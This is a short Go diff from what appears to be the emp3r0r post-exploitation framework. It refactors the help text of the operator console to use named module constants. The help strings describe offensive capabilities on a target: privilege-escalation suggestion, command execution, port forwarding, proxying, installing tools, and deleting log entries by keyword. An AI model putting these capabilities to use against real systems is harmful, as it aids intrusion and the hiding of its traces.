@@ -6,6 +6,7 @@ import (
 	"strings"
 
 	"github.com/fatih/color"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent"
 )
 
 // Commands holds all commands and their help string, command: help
@@ -115,35 +116,35 @@ func CmdHelp(mod string) {
 	switch mod {
 	case "":
 		CliPrettyPrint("Command", "Description", &Commands)
-	case "lpe_suggest":
+	case agent.ModLPE_SUGGEST:
 		help = map[string]string{
 			"lpe_helper": "'unix-privesc-check' or 'linux-exploit-suggester'?",
 		}
 		CliPrettyPrint("Option", "Help", &help)
-	case "cmd":
+	case agent.ModCMD:
 		help = map[string]string{
 			"cmd_to_exec": "Press TAB for some hints",
 		}
 		CliPrettyPrint("Option", "Help", &help)
-	case "port_fwd":
+	case agent.ModPORT_FWD:
 		help = map[string]string{
 			"to_port":     "Port (to forward to) on agent side",
 			"listen_port": "Listen on CC side",
 			"switch":      "Turn port mapping On/Off",
 		}
 		CliPrettyPrint("Option", "Help", &help)
-	case "proxy":
+	case agent.ModPROXY:
 		help = map[string]string{
 			"port":   "Port of our local proxy server",
 			"status": "Turn proxy On/Off",
 		}
 		CliPrettyPrint("Option", "Help", &help)
-	case "vaccine":
+	case agent.ModVACCINE:
 		help = map[string]string{
 			"<N/A>": "vaccine module helps you install additional tools on target system",
 		}
 		CliPrettyPrint("Option", "Help", &help)
-	case "clean_log":
+	case agent.ModCLEAN_LOG:
 		help = map[string]string{
 			"keyword": "Delete all log entries containing this keyword",
 		}
